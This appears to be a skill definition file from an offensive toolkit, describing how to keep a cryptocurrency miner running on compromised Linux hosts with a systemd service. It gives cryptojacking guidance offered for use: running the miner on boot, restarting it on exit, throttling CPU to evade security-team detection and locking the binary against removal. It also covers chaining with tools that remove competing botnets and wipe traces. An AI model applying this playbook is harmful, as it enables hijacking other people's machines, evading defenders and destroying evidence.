---
name: persistence-via-systemd
description: Systemd service for miner auto-restart and reboot survival on Linux hosts
domain: cybersecurity
subdomain: persistence
tags: [persistence, systemd, linux, miner, reboot-survival]
version: '1.0'
nist_csf: [PR.DS-01]
mitre_attack: [T1543.002]
---

## When to use

After deploying a miner on a Linux foothold. Without persistence, a reboot
loses the box. Systemd is the primary persistence mechanism on modern Linux.

## What it does

Creates a systemd service that:
- Starts the miner on boot (`After=network-online.target`)
- Restarts on exit (`Restart=always`)
- Throttles CPU to avoid SOC detection (`CPUQuota=70%`, `Nice=10`)
- Locks the binary with `chattr +ia` so it can't be removed without root

## When NOT to use

- **Containers** — no systemd. Use `cron_persist` instead.
- **Alpine Linux** — OpenRC, not systemd. Use `cron_persist`.
- **Windows** — use `scheduled_task_persist`.

## Chaining

Run `kill_miners` first (removes competing botnets), then `systemd_persist`
after the miner is deployed. Run `cleanup` last to wipe traces.